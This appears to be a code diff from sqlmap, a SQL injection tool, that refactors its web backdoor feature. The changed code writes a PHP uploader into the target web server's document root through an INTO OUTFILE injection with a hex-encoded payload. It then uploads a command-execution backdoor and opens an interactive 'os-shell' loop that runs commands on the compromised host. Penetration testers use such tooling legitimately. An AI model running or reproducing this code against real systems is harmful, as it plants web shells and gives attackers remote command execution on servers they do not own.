@@ -33,6 +33,7 @@ from lib.core.common import getDirs
 from lib.core.common import getDocRoot
 from lib.core.common import randomStr
 from lib.core.common import readInput
+from lib.core.convert import hexencode
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
@@ -79,33 +80,55 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
         return output
 
 
-    def __webBackdoorOsShell(self):
+    def __webBackdoorShell(self, backdoorUrl):
+        infoMsg  = "calling OS shell. To quit type "
+        infoMsg += "'x' or 'q' and press ENTER"
+        logger.info(infoMsg)
+
+        autoCompletion(osShell=True)
+
+        while True:
+            command = None
+
+            try:
+                command = raw_input("os-shell> ")
+            except KeyboardInterrupt:
+                print
+                errMsg = "user aborted"
+                logger.error(errMsg)
+            except EOFError:
+                print
+                errMsg = "exit"
+                logger.error(errMsg)
+                break
+
+            if not command:
+                continue
+
+            if command.lower() in ( "x", "q", "exit", "quit" ):
+                break
+
+            self.__webBackdoorRunCmd(backdoorUrl, command)
+
+
+    def __webBackdoorInit(self):
         """
         This method is used to write a PHP agent (cmd.php) on a writable
         remote directory within the web server document root.
         Such agent is written using the INTO OUTFILE MySQL DBMS
         functionality
-
-        @todo: 
-        * Add a web application crawling functionality to detect
-          all (at least most) web server directories and merge with
-          Google results if the target host is a publicly available
-          hostname or IP address;
-        * Extend the agent to other interpreters rather than only PHP:
-          ASP, JSP, CGI (Python, Perl, Ruby, Bash).
         """
 
         self.checkDbmsOs()
 
+        backdoorUrl = None
         kb.docRoot  = getDocRoot()
         directories = getDirs()
+        directories = list(directories)
+        directories.sort()
 
         infoMsg = "trying to upload the uploader agent"
         logger.info(infoMsg)
-
-        directories = list(directories)
-        directories.sort()
-        uploaded = False
 
         # TODO: backdoor and uploader extensions must be the same as of
         # the web application language in use
@@ -120,29 +143,22 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
             sep = "/"
 
         for directory in directories:
-            if uploaded:
-                break
-
             # Upload the uploader agent
-            uploaderQuery = uploaderStr.replace("WRITABLE_DIR", directory)
-            query  = " LIMIT 1 INTO DUMPFILE '%s%s%s' " % (directory, sep, uploaderName)
-            query += "LINES TERMINATED BY '\\n%s\\n'--" % uploaderQuery
-
-            query = agent.prefixQuery(" %s" % query)
-            query = agent.postfixQuery(query)
-
+            outFile     = os.path.normpath("%s%s%s" % (directory, sep, uploaderName))
+            uplQuery    = uploaderStr.replace("WRITABLE_DIR", directory)
+            query       = " LIMIT 1 INTO OUTFILE '%s' " % outFile
+            query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
+            query       = agent.prefixQuery(" %s" % query)
+            query       = agent.postfixQuery(query)
             payload     = agent.payload(newValue=query)
             page        = Request.queryPage(payload)
-            requestDir  = directory.replace(kb.docRoot, "/").replace("\\", "/")
-            requestDir  = os.path.normpath(requestDir)
 
+            requestDir  = os.path.normpath(directory.replace(kb.docRoot, "/").replace("\\", "/"))
             baseUrl     = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
             uploaderUrl = "%s/%s" % (baseUrl, uploaderName)
-            uploaderUrl = os.path.normpath(uploaderUrl)
+            uplPage, _  = Request.getPage(url=uploaderUrl, direct=True)
 
-            page, _     = Request.getPage(url=uploaderUrl, direct=True)
-
-            if "sqlmap backdoor uploader" not in page:
+            if "sqlmap backdoor uploader" not in uplPage:
                 warnMsg  = "unable to upload the uploader "
                 warnMsg += "agent on '%s'" % directory
                 logger.warn(warnMsg)
@@ -159,7 +175,6 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
                                 "file":      open(backdoorPath, "r"),
                                 "uploadDir": directory,
                               }
-            uploaderUrl = "%s/%s" % (baseUrl, uploaderName)
             page = Request.getPage(url=uploaderUrl, multipart=multipartParams)
 
             if "Backdoor uploaded" not in page:
@@ -169,7 +184,6 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
 
                 continue
 
-            uploaded    = True
             backdoorUrl = "%s/%s" % (baseUrl, backdoorName)
 
             infoMsg  = "the backdoor has been successfully uploaded on "
@@ -177,42 +191,9 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
             infoMsg += "'%s' and enjoy it!" % backdoorUrl
             logger.info(infoMsg)
 
-            if conf.osShell:
-                message  = "do you want to use the uploaded backdoor as a "
-                message += "shell to execute commands right now? [Y/n] "
-                shell = readInput(message, default="Y")
+            break
 
-                if shell in ("n", "N"):
-                    continue
-
-                infoMsg  = "calling OS shell. To quit type "
-                infoMsg += "'x' or 'q' and press ENTER"
-                logger.info(infoMsg)
-
-                autoCompletion(osShell=True)
-
-                while True:
-                    command = None
-
-                    try:
-                        command = raw_input("os-shell> ")
-                    except KeyboardInterrupt:
-                        print
-                        errMsg = "user aborted"
-                        logger.error(errMsg)
-                    except EOFError:
-                        print
-                        errMsg = "exit"
-                        logger.error(errMsg)
-                        break
-
-                    if not command:
-                        continue
-
-                    if command.lower() in ( "x", "q", "exit", "quit" ):
-                        break
-
-                    self.__webBackdoorRunCmd(backdoorUrl, command)
+        return backdoorUrl
 
 
     def uploadChurrasco(self):
@@ -243,10 +224,17 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
         stackedTest()
 
         if kb.stackedTest == False:
-            return
+            infoMsg  = "going to upload a web page backdoor for command "
+            infoMsg += "execution"
+            logger.info(infoMsg)
 
-        self.initEnv()
-        self.runCmd(conf.osCmd)
+            backdoorUrl = self.__webBackdoorInit()
+
+            if backdoorUrl:
+                self.__webBackdoorRunCmd(backdoorUrl, conf.osCmd)
+        else:
+            self.initEnv()
+            self.runCmd(conf.osCmd)
 
 
     def osShell(self):
@@ -257,7 +245,10 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
             infoMsg += "execution"
             logger.info(infoMsg)
 
-            self.__webBackdoorOsShell()
+            backdoorUrl = self.__webBackdoorInit()
+
+            if backdoorUrl:
+                self.__webBackdoorShell(backdoorUrl)
         else:
             self.initEnv()
             self.absOsShell()
